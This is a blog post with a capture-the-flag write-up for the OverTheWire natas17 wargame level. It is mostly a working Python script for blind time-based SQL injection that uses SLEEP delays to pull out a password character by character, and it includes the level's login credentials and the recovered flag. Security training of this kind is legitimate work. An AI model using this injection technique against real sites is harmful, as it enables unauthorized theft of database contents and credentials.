---
layout: post
title: "natas17"
---

29-08-2026
00:30
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260829143639.png' | relative_url }})
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260829143656.png' | relative_url }})since the echo is commented out, we can use a time based sqli attack to get the flag:
``` python
import requests
import time
from requests.auth import HTTPBasicAuth

CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
URL = "http://natas17.natas.labs.overthewire.org/"
basic = HTTPBasicAuth("natas17", "KLdAM3VZux8o6TbkbhuaG5KtYjI77tfx")

i = 0
index = 1;
password = ""

while (True):
    found = False
    for char in CHARS:

        payload = f"""natas18" AND IF (BINARY substring(password,  1, {index}) = '{password + char}', SLEEP(3), False) -- """
        r = requests.post(URL, auth=basic, data = {"username": payload})

        print(f"{payload}: {r.elapsed.total_seconds()}")
        text = r.text

        if r.status_code != 200:
            print("STATUS CODE ERROR\n")
        if (r.elapsed.total_seconds() >= 3):
            password += char
            found = True
            print('\n' + password + '\n')
            break
    index += 1
    if not found:
        break


print("\nfound password:")
print(password)

```
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260829143905.png' | relative_url }})
![]({{ '/ctf/overthewire/natas/pics/Pasted%20image%2020260829143924.png' | relative_url }})

the script might get a few false positives depending on how stable your internet connection is.
flag: fDGn2A6Gsc0BUp3bZw0RNXpg0PZt40op